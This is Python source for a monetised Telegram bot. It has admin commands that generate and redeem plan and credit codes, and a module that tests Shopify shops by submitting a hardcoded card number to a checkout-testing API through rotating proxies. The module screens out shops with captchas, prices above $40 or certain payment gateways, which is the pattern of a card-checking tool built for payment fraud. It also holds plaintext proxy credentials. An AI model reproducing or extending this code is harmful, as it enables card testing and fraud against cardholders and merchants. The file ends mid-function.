async def generate_redeem_codes_background(update, context, plan_type: str, count: int):
    """
    Generate redeem codes in background.
    
    Args:
        update: Telegram update object
        context: Telegram context object
        plan_type: Type of plan (plan1, plan2, etc.)
        count: Number of codes to generate
    """
    try:
        plan_info = PLANS.get(plan_type)
        if not plan_info:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Error</b></pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>Invalid plan type</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Generate codes
        codes = []
        for i in range(count):
            # Add progress indicator for large batches
            if count > 10 and i % 5 == 0:
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=background_tasks[update.effective_user.id]["message_id"],
                        text=f"""<pre>🔄 <b>Generating Redeem Codes...</b></pre>
<pre>Creating {count} codes for {plan_info["name"]}...</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Status</b> ↬ <i>Progress: {i+1}/{count} codes generated</i>""",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logger.error(f"Error updating progress message: {e}")
            
            code = generate_redeem_code()
            # Store in database
            save_redeem_code(code, plan_info["tier"], plan_info["duration_days"])
            codes.append(code)
        
        # Format response with styled codes
        codes_text = ""
        for i, code in enumerate(codes):
            if i % 2 == 0:  # Alternate styling for better visual
                codes_text += f"<a href='https://t.me/rev3rsex'>⬜</a> <code>{code}</code>\n"
            else:
                codes_text += f"<a href='https://t.me/rev3rsex'>⬛</a> <code>{code}</code>\n"
        
        # Update message with generated codes
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=background_tasks[update.effective_user.id]["message_id"],
            text=f"""<pre><a href='https://t.me/rev3rsex'>✅</a> <b>Redeem Codes Generated</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Plan</b> ↬ {plan_info["emoji"]} {plan_info["name"]}
<a href='https://t.me/rev3rsex'>⊀</a> <b>Tier</b> ↬ <code>{plan_info["tier"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Duration</b> ↬ <code>{plan_info["duration_days"]} days</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Codes Generated</b> ↬ <code>{count}</code>

<a href='https://t.me/rev3rsex'>⊚</a> <b>Generated Codes</b>
{codes_text}
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode=ParseMode.HTML
        )
        
        # Log generation
        logger.info(f"Generated {count} redeem codes for {plan_info['name']} by admin {update.effective_user.id}")
        
    except Exception as e:
        logger.error(f"Error generating redeem codes: {e}")
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Error</b></pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>{str(e)}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
        except Exception as e2:
            logger.error(f"Error sending error message: {e2}")
    
    finally:
        # Remove task from background tasks dictionary
        if update.effective_user.id in background_tasks:
            del background_tasks[update.effective_user.id]
        # Mark user as no longer having an active request
        if update.effective_user.id in active_requests:
            active_requests[update.effective_user.id] = False

async def generate_credits_codes_background(update, context, count: int):
    """
    Generate redeem codes with 100 credits in background.
    
    Args:
        update: Telegram update object
        context: Telegram context object
        count: Number of codes to generate
    """
    try:
        # Generate codes
        codes = []
        for i in range(count):
            # Add progress indicator for large batches
            if count > 10 and i % 5 == 0:
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=background_tasks[update.effective_user.id]["message_id"],
                        text=f"""<pre>🔄 <b>Generating Credits Codes...</b></pre>
<pre>Creating {count} codes with 100 credits each...</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Status</b> ↬ <i>Progress: {i+1}/{count} codes generated</i>""",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logger.error(f"Error updating progress message: {e}")
            
            code = generate_redeem_code()
            # Store in database with 100 credits (special tier)
            save_redeem_code(code, "Credits", 0)  # 0 duration means 100 credits
            codes.append(code)
        
        # Format response with styled codes
        codes_text = ""
        for i, code in enumerate(codes):
            if i % 2 == 0:  # Alternate styling for better visual
                codes_text += f"<a href='https://t.me/rev3rsex'>⬜</a> <code>{code}</code>\n"
            else:
                codes_text += f"<a href='https://t.me/rev3rsex'>⬛</a> <code>{code}</code>\n"
        
        # Update message with generated codes
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=background_tasks[update.effective_user.id]["message_id"],
            text=f"""<pre><a href='https://t.me/rev3rsex'>✅</a> <b>Credits Codes Generated</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Type</b> ↬ <code>100 Credits</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Codes Generated</b> ↬ <code>{count}</code>

<a href='https://t.me/rev3rsex'>⊚</a> <b>Generated Codes</b>
{codes_text}
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode=ParseMode.HTML
        )
        
        # Log generation
        logger.info(f"Generated {count} credits codes by admin {update.effective_user.id}")
        
    except Exception as e:
        logger.error(f"Error generating credits codes: {e}")
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Error</b></pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>{str(e)}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
        except Exception as e2:
            logger.error(f"Error sending error message: {e2}")
    
    finally:
        # Remove task from background tasks dictionary
        if update.effective_user.id in background_tasks:
            del background_tasks[update.effective_user.id]
        # Mark user as no longer having an active request
        if update.effective_user.id in active_requests:
            active_requests[update.effective_user.id] = False

async def handle_gplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE, plan_type: str):
    """Handle /gplan commands to generate redeem codes."""
    # Check if user is admin
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(
            "<pre>⚠️ <b>Access Denied</b></pre>\n\n"
            "<i>You don't have permission to use this command.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if user already has an active request (to prevent spamming)
    if update.effective_user.id in active_requests and active_requests[update.effective_user.id]:
        await update.message.reply_text(
            "⏳ <b>Please wait for your current request to complete before sending another one.</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if count was provided
    if not context.args:
        await update.message.reply_text(
            f"<pre>⚠️ <b>Missing Count</b></pre>\n\n"
            f"<i>Usage: /{plan_type} 5 (to generate 5 codes)</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get count from command
    try:
        count = int(context.args[0])
        if count <= 0 or count > 50:  # Limit to prevent abuse
            await update.message.reply_text(
                "<pre>⚠️ <b>Invalid Count</b></pre>\n\n"
                "<i>Please provide a number between 1 and 50.</i>",
                parse_mode=ParseMode.HTML
            )
            return
    except ValueError:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid Count</b></pre>\n\n"
            "<i>Please provide a valid number.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if there's already a background task running for this user
    if update.effective_user.id in background_tasks:
        await update.message.reply_text(
            "<pre>⚠️ <b>Already Processing</b></pre>\n\n"
            "<i>Please wait for current operation to complete.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Mark this user as having an active request
    active_requests[update.effective_user.id] = True
    
    # Send a processing message
    processing_message = await update.message.reply_text(
        f"""<pre>🔄 <b>Generating Redeem Codes...</b></pre>
<pre>Creating {count} codes for {PLANS[plan_type]['name']}...</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Status</b> ↬ <i>Processing in background</i>""",
        parse_mode=ParseMode.HTML
    )
    
    # Store message ID for later editing
    background_tasks[update.effective_user.id] = {
        "message_id": processing_message.message_id
    }
    
    # Create and start background task
    task = asyncio.create_task(generate_redeem_codes_background(update, context, plan_type, count))
    background_tasks[update.effective_user.id]["task"] = task

async def handle_gcodes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /gcodes command to generate credits codes."""
    # Check if user is admin
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(
            "<pre>⚠️ <b>Access Denied</b></pre>\n\n"
            "<i>You don't have permission to use this command.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if user already has an active request (to prevent spamming)
    if update.effective_user.id in active_requests and active_requests[update.effective_user.id]:
        await update.message.reply_text(
            "⏳ <b>Please wait for your current request to complete before sending another one.</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if count was provided
    if not context.args:
        await update.message.reply_text(
            "<pre>⚠️ <b>Missing Count</b></pre>\n\n"
            "<i>Usage: /gcodes 5 (to generate 5 codes)</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get count from command
    try:
        count = int(context.args[0])
        if count <= 0 or count > 50:  # Limit to prevent abuse
            await update.message.reply_text(
                "<pre>⚠️ <b>Invalid Count</b></pre>\n\n"
                "<i>Please provide a number between 1 and 50.</i>",
                parse_mode=ParseMode.HTML
            )
            return
    except ValueError:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid Count</b></pre>\n\n"
            "<i>Please provide a valid number.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if there's already a background task running for this user
    if update.effective_user.id in background_tasks:
        await update.message.reply_text(
            "<pre>⚠️ <b>Already Processing</b></pre>\n\n"
            "<i>Please wait for current operation to complete.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Mark this user as having an active request
    active_requests[update.effective_user.id] = True
    
    # Send a processing message
    processing_message = await update.message.reply_text(
        f"""<pre>🔄 <b>Generating Credits Codes...</b></pre>
<pre>Creating {count} codes with 100 credits each...</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Status</b> ↬ <i>Processing in background</i>""",
        parse_mode=ParseMode.HTML
    )
    
    # Store message ID for later editing
    background_tasks[update.effective_user.id] = {
        "message_id": processing_message.message_id
    }
    
    # Create and start background task
    task = asyncio.create_task(generate_credits_codes_background(update, context, count))
    background_tasks[update.effective_user.id]["task"] = task

async def handle_claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /claim command to redeem a code."""
    # Check if a code was provided
    if not context.args:
        await update.message.reply_text(
            "<pre>⚠️ <b>Missing Code</b></pre>\n\n"
            "<i>Usage: /claim CXGFT-ABC123DEF456</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get code from command
    code = context.args[0].strip()
    
    # Validate code format (must start with CXGFT-)
    if not code.startswith("CXGFT-"):
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid Code Format</b></pre>\n\n"
            "<i>Redeem codes must start with CXGFT-.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get user info
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # Check if user already has an active request (to prevent spamming)
    if user_id in active_requests and active_requests[user_id]:
        await update.message.reply_text(
            "⏳ <b>Please wait for your current request to complete before sending another one.</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if there's already a background task running for this user
    if user_id in background_tasks:
        await update.message.reply_text(
            "<pre>⚠️ <b>Already Processing</b></pre>\n\n"
            "<i>Please wait for current operation to complete.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Mark this user as having an active request
    active_requests[user_id] = True
    
    # Send a processing message
    processing_message = await update.message.reply_text(
        f"""<pre>🔄 <b>Validating Redeem Code...</b></pre>
<pre>Checking code: {code}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Status</b> ↬ <i>Processing in background</i>""",
        parse_mode=ParseMode.HTML
    )
    
    # Store message ID for later editing
    background_tasks[user_id] = {
        "message_id": processing_message.message_id
    }
    
    # Create and start background task
    task = asyncio.create_task(claim_redeem_code_background(update, context, code))
    background_tasks[user_id]["task"] = task

async def claim_redeem_code_background(update, context, code):
    """
    Process redeem code in background.
    
    Args:
        update: Telegram update object
        context: Telegram context object
        code: Redeem code to process
    """
    try:
        # Check if code exists in database
        code_info = get_redeem_code_info(code)
        
        if not code_info:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Invalid Code</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Code</b> ↬ <code>{code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>This redeem code is invalid or has already been used.</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Get plan details from code info
        tier = code_info["tier"]
        duration_days = code_info["duration_days"]
        
        # Handle credits codes (special tier)
        if tier == "Credits":
            # Add 100 credits to user
            update_user_credits(update.effective_user.id, 100)
            
            # Mark code as used in database
            mark_redeem_code_as_used(code, update.effective_user.id)
            
            # Format success message
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>✅</a> <b>Code Redeemed Successfully</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Code</b> ↬ <code>{code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Type</b> ↬ <code>100 Credits</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Credits Added</b> ↬ <code>+100</code>

<a href='https://t.me/rev3rsex'>ℭ</a> <b>Benefits:</b> <i>100 credits added to your account</i>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Access:</b> <i>Use these credits for any command</i>

<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
            
            # Log redemption
            logger.info(f"User {update.effective_user.id} redeemed credits code {code}")
            return
        
        # Check if user has an active plan
        user_has_active_plan = has_user_active_plan(update.effective_user.id)
        
        # Find plan info for regular plans
        plan_info = None
        for plan_id, info in PLANS.items():
            if info["tier"] == tier:
                plan_info = info
                break
        
        if not plan_info:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Invalid Plan</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Code</b> ↬ <code>{code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>This code is for an invalid plan.</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
            return
        
        # If user has an active plan, don't allow redeeming another plan
        if user_has_active_plan:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Redemption Failed</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Code</b> ↬ <code>{code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>You already have an active plan. You cannot redeem another plan while your current plan is active.</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Calculate expiry date
        expiry_date = datetime.now() + timedelta(days=duration_days)
        
        # Update user plan in database
        success = update_user_plan(update.effective_user.id, tier, expiry_date)
        
        if success:
            # Mark code as used in database
            mark_redeem_code_as_used(code, update.effective_user.id)
            
            # Format success message
            expiry_formatted = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
            
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>✅</a> <b>Code Redeemed Successfully</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Code</b> ↬ <code>{code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Plan</b> ↬ {plan_info["emoji"]} {plan_info["name"]}
<a href='https://t.me/rev3rsex'>⊀</a> <b>Tier</b> ↬ <code>{tier}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Duration</b> ↬ <code>{duration_days} days</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Expires</b> ↬ <code>{expiry_formatted}</code>

<a href='https://t.me/rev3rsex'>ℭ</a> <b>Benefits:</b> <i>Unlimited credits until plan ends</i>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Access:</b> <i>No cooldowns on any commands</i>

<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
            
            # Log redemption
            logger.info(f"User {update.effective_user.id} redeemed code {code} for {plan_info['name']}")
        else:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Redemption Failed</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Code</b> ↬ <code>{code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>Failed to update your plan. Please try again later.</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        logger.error(f"Error claiming redeem code: {e}")
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=background_tasks[update.effective_user.id]["message_id"],
                text=f"""<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Error</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Response</b> ↬ <code>{str(e)}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>User</b> ↬ <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode=ParseMode.HTML
            )
        except Exception as e2:
            logger.error(f"Error sending error message: {e2}")
    
    finally:
        # Remove task from background tasks dictionary
        if update.effective_user.id in background_tasks:
            del background_tasks[update.effective_user.id]
        # Mark user as no longer having an active request
        if update.effective_user.id in active_requests:
            active_requests[update.effective_user.id] = False

# Individual command handlers
async def handle_gplan1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_gplan_command(update, context, "plan1")

async def handle_gplan2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_gplan_command(update, context, "plan2")

async def handle_gplan3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_gplan_command(update, context, "plan3")

async def handle_gplan4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_gplan_command(update, context, "plan4")

async def handle_gcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_gcodes_command(update, context)

async def handle_claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_claim_command(update, context)



# ============================================================
# MODULE: seturl
# ============================================================
# Configure logging

# API endpoint for testing sites
API_BASE_URL = SHOPIFY_SETURL_API_URL

# Test card for site validation
TEST_CARD = "4910149950579116|03|28|106"

# Dictionary to track pending validations waiting for price selection
PENDING_VALIDATIONS = {}

# Dictionary to track active processes per user
active_processes = {}

# Database functions for user sites
def get_user_sites(user_id: int) -> List[str]:
    """
    Get list of sites for a user from database.
    
    Args:
        user_id: ID of the user
        
    Returns:
        List of site URLs
    """
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        # Create table if it doesn't exist
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_sites (
            user_id INTEGER,
            site_url TEXT,
            PRIMARY KEY (user_id, site_url)
        )
        ''')
        
        # Get user sites
        cursor.execute('SELECT site_url FROM user_sites WHERE user_id = ?', (user_id,))
        sites = [row[0] for row in cursor.fetchall()]
        
        conn.close()
        return sites
    except Exception as e:
        logger.error(f"Error getting user sites: {str(e)}")
        return []

def add_user_site(user_id: int, site_url: str) -> bool:
    """
    Add a site to the user's list of sites.
    
    Args:
        user_id: ID of the user
        site_url: URL of the site to add
        
    Returns:
        True if successful, False otherwise
    """
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        # Create table if it doesn't exist
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_sites (
            user_id INTEGER,
            site_url TEXT,
            PRIMARY KEY (user_id, site_url)
        )
        ''')
        
        # Insert the site
        cursor.execute('INSERT OR IGNORE INTO user_sites (user_id, site_url) VALUES (?, ?)', 
                       (user_id, site_url))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error adding user site: {str(e)}")
        return False

def add_working_sites(user_id: int, working_sites: List[str]) -> bool:
    """
    Add multiple working sites to the user's list.
    
    Args:
        user_id: ID of the user
        working_sites: List of working site URLs
        
    Returns:
        True if successful, False otherwise
    """
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        # Create table if it doesn't exist
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_sites (
            user_id INTEGER,
            site_url TEXT,
            PRIMARY KEY (user_id, site_url)
        )
        ''')
        
        # Insert all working sites
        for site_url in working_sites:
            cursor.execute('INSERT OR IGNORE INTO user_sites (user_id, site_url) VALUES (?, ?)', 
                           (user_id, site_url))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error adding working sites: {str(e)}")
        return False

def remove_user_site(user_id: int, site_url: str) -> bool:
    """
    Remove a site from the user's list of sites.
    
    Args:
        user_id: ID of the user
        site_url: URL of the site to remove
        
    Returns:
        True if successful, False otherwise
    """
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        # Delete the site
        cursor.execute('DELETE FROM user_sites WHERE user_id = ? AND site_url = ?', 
                       (user_id, site_url))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error removing user site: {str(e)}")
        return False

def remove_all_user_sites(user_id: int) -> bool:
    """
    Remove all sites from the user's list.
    
    Args:
        user_id: ID of the user
        
    Returns:
        True if successful, False otherwise
    """
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        # Delete all sites for the user
        cursor.execute('DELETE FROM user_sites WHERE user_id = ?', (user_id,))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error removing all user sites: {str(e)}")
        return False

def extract_domain_from_url(url: str) -> str:
    """
    Extract just the domain (with https://) from a full URL.
    
    Args:
        url: Full URL
        
    Returns:
        Domain with https:// prefix
    """
    # Ensure URL uses HTTPS
    if url.startswith('http://'):
        url = url.replace('http://', 'https://', 1)
    elif not url.startswith('https://'):
        url = 'https://' + url
    
    # Extract domain using regex
    domain_match = re.match(r'(https://[^/]+)', url)
    if domain_match:
        return domain_match.group(1)
    
    # Fallback to returning the URL with HTTPS
    return url

# Hardcoded proxies for rotation
HARDCODED_PROXIES = [
    "http://0A2JelrNEymAcMsT:cHo1x72JjZPwB0lg@geo.g-w.info:10080",
    "http://g7GxaNTU0FzL14da:xzE9IpVCdvZ1uhtz@geo.g-w.info:10080",
    "http://rw38SdWb8zuPdfWl:4nC2GX9y4cjWOa7Y@geo.g-w.info:10080",
    "http://TnReJ3edUaeYfYLu:b7hgKKZt5nVWP965@geo.g-w.info:10080"
]

# Error messages that indicate a site is not working
RETRY_ERRORS = [
    'r4 token empty',
    'risky',
    'item is not in cart',
    'product not found',    
    'hcaptcha detected',
    'tax ammount empty',
    'Error in 1 req: OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to',
    'del ammount empty',
    'product id is empty',
    'Error in 1 req: Could not resolve host:',
    'py id empty',
    'clinte token',
    'HCAPTCHA_DETECTED',
    'RECEIPT_EMPTY',
    'NA',
    'r2 id empty',
    'Site requires login!',
    'Failed to get token',
    'No Valid Products',
    'Not Shopify!',
    'AMOUNT_TOO_SMALL',
    'Captcha at Checkout - Use good proxies!',
    'Payment method is not shopify!',
    'Site not supported for now!',
    'Connection error',
    'error',
    'receipt_empty',
    'amount_too_small',
    'HCAPTCHA_DETECTED',
    'Token Not Found',
    'INVALID_RESPONSE',
    # Added specific payment gateways to reject
    'authorize.net',
    'ONERWAY (Direct)'
]

# cURL errors that should trigger a retry with proxy rotation
CURL_ERRORS = [
    'cURL error: Recv failure: Connection reset by peer',
    'cURL error: OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to',
    'cURL error: CONNECT tunnel failed, response 500',
    'cURL error: Proxy CONNECT aborted',
    'cURL error:'
]

def is_curl_error(response_text: str) -> bool:
    """
    Check if the response text contains a cURL error that should trigger a retry.
    
    Args:
        response_text: Response text from the API
        
    Returns:
        True if it's a cURL error that should trigger a retry, False otherwise
    """
    for error in CURL_ERRORS:
        if error in response_text:
            return True
    return False

def has_restricted_gateway(response_text: str) -> bool:
    """
    Check if the response text indicates a restricted payment gateway.
    
    Args:
        response_text: Response text from the API
        
    Returns:
        True if the gateway is restricted, False otherwise
    """
    # Check for authorize.net
    if 'authorize.net' in response_text.lower():
        return True
    
    # Check for ONERWAY (Direct)
    if 'onerway' in response_text.lower() and 'direct' in response_text.lower():
        return True
    
    return False

async def test_site(site_url: str, user_id: int, proxy_index: int = 0, retry_count: int = 0) -> Tuple[bool, str, str]:
    """
    Test a single site with a test card.
    
    Args:
        site_url: URL of the site to test
        user_id: ID of the user (for getting proxies)
        proxy_index: Index of the proxy to use
        retry_count: Number of retries already attempted
        
    Returns:
        Tuple of (is_working, response_text, price)
    """
    try:
        # Extract domain from URL
        domain = extract_domain_from_url(site_url)
        
        # Get proxy for this request from hardcoded list
        proxy = HARDCODED_PROXIES[proxy_index % len(HARDCODED_PROXIES)]
        # Remove http:// from proxy if present
        proxy_for_api = proxy
        if proxy_for_api.startswith("http://"):
            proxy_for_api = proxy_for_api[7:]
        elif proxy_for_api.startswith("https://"):
            proxy_for_api = proxy_for_api[8:]
        
        # Prepare API URL with query parameters including the proxy
        api_url = f"{API_BASE_URL}?cc={TEST_CARD}&url={domain}&proxy={proxy_for_api}"
        
        # Use aiohttp for async HTTP request with extended timeout of 60 seconds
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as response:
                if response.status >= 500:
                    return False, f"Server error: {response.status}", ""
                
                api_response = await response.json()
                response_text = api_response.get("Response", "")
                price = api_response.get("Price", "")
                gateway = api_response.get("Gateway", "")
                
                # Convert price to float for comparison
                price_value = 0
                if price:
                    try:
                        # Remove currency symbols and convert to float
                        price_clean = re.sub(r'[^\d.]', '', price)
                        price_value = float(price_clean)
                    except (ValueError, TypeError):
                        price_value = 0
                
                # Check if price is higher than $40, mark as dead if so
                if price_value > 40:
                    return False, f"Price too high: ${price_value}", price
                
                # Check for restricted payment gateways (authorize.net or ONERWAY (Direct))
                if gateway and (
                    'authorize.net' in gateway.lower() or 
                    ('onerway' in gateway.lower() and 'direct' in gateway.lower())
                ):
                    logger.info(f"Site {site_url} uses restricted payment gateway: {gateway}")
                    return False, f"Restricted gateway: {gateway}", price
                
                # Check if response contains any error that indicates a dead site
                response_text_lower = response_text.lower()
                for error in RETRY_ERRORS:
                    if error.lower() in response_text_lower:
                        return False, response_text, price
                
                # Check if it's a cURL error and we should retry
                if is_curl_error(response_text) and retry_count < 3:
                    # Try with a different proxy
                    new_proxy_index = (proxy_index + 1) % len(HARDCODED_PROXIES)
                    logger.info(f"Retrying {site_url} with proxy {HARDCODED_PROXIES[new_proxy_index]} (attempt {retry_count + 1})")
                    return await test_site(site_url, user_id, new_proxy_index, retry_count + 1)
                
                # If we get here, the site is working
                return True, response_text, price
    
    except asyncio.TimeoutError:
        logger.info(f"Timeout testing {site_url} with proxy {proxy}")
        # Retry with a different proxy if we haven't reached max retries
